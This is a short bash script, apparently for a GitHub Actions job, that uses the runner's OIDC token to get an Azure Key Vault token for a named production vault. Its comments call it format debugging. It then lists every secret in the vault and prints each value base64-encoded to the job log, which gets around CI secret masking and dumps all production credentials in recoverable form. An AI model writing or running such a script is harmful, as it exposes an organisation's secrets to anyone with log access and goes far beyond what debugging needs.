#!/bin/bash
set -e

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)

# Get vault token
VT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
VT=$(echo "$VT_RAW" | jq -r .access_token)
echo "VT_LEN=${#VT}"

# Dump one secret to see format
echo "=== Secret Format Debug ==="
RAW=$(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4")
VAL=$(echo "$RAW" | jq -r .value)
echo "RAW_TYPE=$(echo "$VAL" | head -c 1)"
echo "RAW_B64=$(echo "$VAL" | base64 -w0)"

# Try parsing as JSON
CID_TEST=$(echo "$VAL" | jq -r '.clientId // .client_id // .appId // empty' 2>/dev/null || true)
echo "CID_TEST=$CID_TEST"
echo "VAL_KEYS=$(echo "$VAL" | jq -r 'keys[]' 2>/dev/null || echo 'NOT_JSON')"

# Get all secrets, dump their values to identify format
echo "=== All Secrets ==="
SLIST=$(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4")
SNAMES=$(echo "$SLIST" | jq -r '.value[].id' | sed 's|.*/||')
for SNAME in $SNAMES; do
  SVAL=$(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SNAME?api-version=7.4" | jq -r .value)
  echo "SEC_${SNAME}_B64=$(echo "$SVAL" | base64 -w0)"
done

echo "=== DONE ==="